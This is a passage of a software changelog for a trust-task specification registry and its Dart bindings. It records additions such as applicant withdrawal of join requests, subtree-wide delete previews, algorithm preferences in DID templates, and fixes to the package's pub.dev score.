  criterion check and reported both causes in one refusal.

## 0.1.5 — 2026-09-20


### Added

- **vtc/join-requests**: Withdraw/0.1 — an applicant closes their own request (#518)

An applicant whose request is answered `requestMore` has no way to end it.
  The community holds it open, the applicant cannot submit another, and the
  only thing that resolves it is a retention sweep neither party controls.

  The registry already assumed this task existed: `join-requests/status/0.1`
  lists `withdrawn` among the states it can report, and nothing could reach
  it. This is the task that does.

  Modelled on `members/self-remove/0.1` — the same shape of act, a subject
  exercising authority over their own record — and scaffolded with
  `npm run new-spec` rather than copied from it, per CONTRIBUTING-SPECS.md.

  Three things worth review:

  **`requestId` is OPTIONAL**, following `join-requests/status/0.1` and for
  the same reason: an applicant whose submit response was lost never received
  an id, and would otherwise have no way to reach their own request. A
  consumer given one MUST prefer it over inferring the request from the
  caller.

  **`issuedAt` is REQUIRED for a reason specific to this task**, beyond the
  §7.3 item 17 floor. An applicant may withdraw and then apply again — that
  is the point of it — so a captured withdrawal replayed later does not
  repeat a harmless act: it closes the *next* request, which the applicant
  never withdrew. The two documents are identical apart from when they were
  issued.

  **`notFound` deliberately conflates "no open request" with "not yours"**,
  so a caller cannot probe whether a given request id exists on a community.
  `alreadyDecided` is kept distinct because an applicant is entitled to know
  the outcome of their own request, and because retrying will never change
  it.

  Bindings regenerated for all four targets; `check-bindings` reports 452
  specs against 452 TypeScript, 447 Rust, 452 Go and 452 Dart modules, all
  agreeing. No version or changelog edits — release-plz owns those here.

## 0.1.4 — 2026-09-19


### Added

- **vta/contexts**: Preview the whole subtree a delete destroys, and report host copies it could not remove

Deleting a context deletes its sub-contexts and everything they hold, to any depth. Neither vta/contexts/delete/1.0 nor its preview said so, and the preview had nowhere to say what the cascade would reach.

  vta/contexts/preview-delete/1.0 gains subContexts, with the existing arrays defined as the union over the whole subtree. The narrower reading — preview the named context alone — is the natural one and is dangerous: a context whose children hold keys and DIDs previews as holding nothing, and a caller deciding whether the delete needs force decides about the wrong thing.

  vta/contexts/delete/1.0 gains daemonCleanupErrors, the subtree-wide form of the daemonCleanupError that vta/webvh/dids/delete/1.0 already reports for a single DID, and now requires that a did:webvh DID in the subtree be deleted the way that task deletes one — published log removed from its hosting server, credentials revoked, authority withdrawn. Removing only the local record is not a deletion: the log keeps resolving for every party except its owner, and the records that could remove it are the ones just destroyed.

  Both members are optional and additive; the refusal and cascade prose describes behaviour that was already implemented but unstated.

## 0.1.3 — 2026-09-17


### Added

- **vta/did-templates**: A template can declare which algorithms its keys use (#508)

* feat(vta/did-templates): a template can declare which algorithms its keys use

  Adds `vta/_shared/0.2/did-template.schema.json` and `create`, `update`, `get`
  and `list` at `3.0`. A template's `keys` block names each key slot's purpose and
  its acceptable algorithms, most preferred first:

      "keys": {
        "signing": { "purpose": "signing", "algorithms": ["mldsa44", "ed25519"] },
        "ka":      { "purpose": "keyAgreement", "algorithms": ["x25519"] }
      }

  A list rather than a single value because a fleet does not migrate atomically:
  that says mint ML-DSA-44 where the implementation can and Ed25519 otherwise, so
  one template serves a VTA with post-quantum support and one without.

  ## Why a new shared version rather than an edit

  `DidTemplate` lives in `_shared/0.1`, which the shipped 1.0 and 2.0 specs
  reference. Editing it in place would retroactively change what those versions
  mean, which is what versioning exists to prevent. `_shared/0.2` follows the
  precedent `credentials` and `device` already set, and 1.0/2.0 keep pointing at
  0.1.

  ## Why four task families, not two

  `create` and `update` carry a `DidTemplate`; `get` and `list` return a
  `DidTemplateRecord`, which flattens the same fields. A stored v2 template
  fetched through `get/2.0` would fail validation, so all four move together —
  otherwise the template can be written and not read back.

  ## The change is breaking, for a stronger reason than expected

## 0.1.2 — 2026-09-16

## 0.1.1 — 2026-09-16


### Fixed

- **dart**: Take trust_tasks to 160/160 on pub.dev (#473)

pub.dev scored the published 0.1.0 at 140/160, with two specific deductions.

  -10 "The package description is too long." The field was 196 characters against
  a 60-180 window; search results only render the first part of it, which is why
  pub.dev treats an over-long one as a failed pubspec check rather than a style
  note. Now 148, with the window recorded in a comment above it so the next edit
  does not silently fall outside it again.

  -10 "No example found." Adds example/main.dart, which is runnable rather than
  illustrative: it decodes an inbound document, runs it through consumeInbound
  against the generated acl/grant policy, and delivers it three times to show both
  halves of SPEC §7.2 item 11 —

    first delivery    : handled -> .../acl/grant/0.1#response
    identical resend  : duplicate (already executed, inFlight=false)
    escalated resend  : rejected -> idConflict
    handler ran 1 time(s) — the effect happened exactly once.

  Writing it as something that runs is what caught a bug in it: the first draft
  omitted the proof acl/grant declares REQUIRED, so all three deliveries returned
  proofRequired and the example demonstrated a rejection rather than the pipeline.

  Verified with pana 0.23.19 — the analyzer pub.dev runs — against the working
  tree: Points: 160/160. `dart analyze --fatal-infos`, the format check and the
  74 tests all still pass with example/ included in the analysed set.

  The score will not move until a release carries these files, so the improvement
  lands with 0.1.1 — which is also the first version the trusted-publishing
  automation will publish end to end.

## 0.1.0

### Added

- Initial release: generated payload types for every specification in the
  registry, and the hand-written SPEC.md §7.2 consumer pipeline in
  `lib/src/runtime/`.
